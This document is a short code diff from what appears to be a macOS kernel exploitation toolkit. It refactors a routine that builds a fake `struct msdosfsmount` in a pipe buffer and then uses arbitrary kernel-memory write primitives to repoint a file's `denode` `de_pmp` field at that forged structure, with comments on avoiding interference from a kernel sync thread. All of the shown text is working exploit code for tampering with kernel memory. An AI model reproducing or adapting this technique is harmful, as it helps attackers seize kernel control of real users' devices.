@@ -94,29 +94,31 @@ xe_util_vnode_t xe_util_vnode_create(void) {
     int cctl_fd = open(buffer, O_RDONLY);
     xe_assert(cctl_fd >= 0);
     
-    /// Create a fake `struct msdosfsmount`
-    xe_util_pipe_t fake_mount = xe_util_pipe_create(TYPE_MSDOSFSMOUNT_SIZE);
-    xe_kmem_copy(xe_util_pipe_get_address(fake_mount), msdosfs_mount, TYPE_MSDOSFSMOUNT_SIZE);
-    
     uintptr_t cctl_vnode;
     error = xe_xnu_proc_find_fd_data(proc, cctl_fd, &cctl_vnode);
     xe_assert_err(error);
     uintptr_t cctl_dep = xe_kmem_read_ptr(cctl_vnode, TYPE_VNODE_MEM_VN_DATA_OFFSET);
     xe_assert_cond(xe_kmem_read_uint64(cctl_dep, TYPE_DENODE_MEM_DE_PMP_OFFSET), ==, msdosfs_mount);
-    /// Instead of directly changing the actual `struct msdosfsmount`, we will create a fake
-    /// `struct msdosfsmount` and set the member `de_pmp` of the `struct denode` of the `cctl_fd`.
-    /// This will only make FS operations on `cctl_fd` to use this fake mount. This is done to
-    /// prevent the background thread `pm_sync_timer` started by `msdosfs.kext` when the file
-    /// system is mounted, from interfering with the changed FAT vnode and cache
-    xe_kmem_write_uint64(cctl_dep, TYPE_DENODE_MEM_DE_PMP_OFFSET, xe_util_pipe_get_address(fake_mount));
     
     xe_util_vnode_t util = malloc(sizeof(struct xe_util_vnode));
     util->msdosfs_util = msdosfs_util;
     util->cctl_fd = cctl_fd;
     util->msdosfs_mount = msdosfs_mount;
     util->cctl_denode = cctl_dep;
-    util->fake_mount_pipe = fake_mount;
+    util->fake_mount_pipe = xe_util_pipe_create(TYPE_MSDOSFSMOUNT_SIZE);
+    
     xe_kmem_read(util->msdosfs_mount_backup, msdosfs_mount, 0, sizeof(util->msdosfs_mount_backup));
+    xe_util_pipe_write(util->fake_mount_pipe, util->msdosfs_mount_backup, sizeof(util->msdosfs_mount_backup));
+    
+    /// Instead of directly changing the actual `struct msdosfsmount`, we will create a fake
+    /// `struct msdosfsmount` and set the member `de_pmp` of the `struct denode` of the `cctl_fd`.
+    /// This will only make FS operations on `cctl_fd` to use this fake mount. This is done to
+    /// prevent the background thread `pm_sync_timer` started by `msdosfs.kext` when the file
+    /// system is mounted, from interfering with the changed FAT vnode and cache
+    /// NOTE: keep this kmem write at the end because this module is used to create
+    /// `kmem_fast` and the boostrap kmem implementation used to create `kmem_fast`
+    /// might prefer all write ops performed after read (ex: `xe_kmem/kmem_boostrap.c`)
+    xe_kmem_write_uint64(cctl_dep, TYPE_DENODE_MEM_DE_PMP_OFFSET, xe_util_pipe_get_address(util->fake_mount_pipe));
     
     return util;
 }
